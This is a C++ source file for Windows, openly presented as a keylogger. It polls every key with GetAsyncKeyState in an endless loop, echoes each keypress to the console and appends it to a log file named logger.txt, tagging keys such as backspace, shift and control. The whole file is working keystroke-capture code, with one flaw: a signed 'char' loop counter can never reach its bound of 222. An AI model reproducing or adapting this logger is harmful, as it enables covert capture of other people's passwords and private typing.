#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <unistd.h>

using namespace std;

void keys();

int main()
{
    cout << "\nInitiating Keylogger..." << endl;
    sleep(5);
    cout << "\nKeylogger Initiated, Ready to be used." << endl;
    keys();
    return 0;
}

void keys()
{
    char key;
    ofstream file("logger.txt", ios::app);
    for (;;)
    {
        for (key = 8; key < 222; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {

                switch (key)
                {
                case 8:
                    file << "[BACKSPACE]" << endl;
                    cout << "[BACKSPACE]" << endl;

                    break;

                case 27:
                    file << "[ESCAPE]" << endl;
                    cout << "[ESCAPE]" << endl;
                    break;

                case 13:
                    file << "[RETURN]" << endl;
                    cout << "[RETURN]" << endl;
                    break;

                case 127:
                    file << "[DEL]" << endl;
                    cout << "[DEL]" << endl;
                    break;

                case 9:
                    file << "[TAB]" << endl;
                    cout << "[TAB]" << endl;
                    break;

                case 17:
                    file << "[CTRL]" << endl;
                    cout << "[CTRL]" << endl;
                    break;

                case 16:
                    file << "[SHIFT]" << endl;
                    cout << "[SHIFT]" << endl;
                    break;

                default:
                    file << "[" << key << "]" << endl;
                    cout << "[" << key << "]" << endl;
                    break;
                }
            }
        }
    }
    file.close();
}
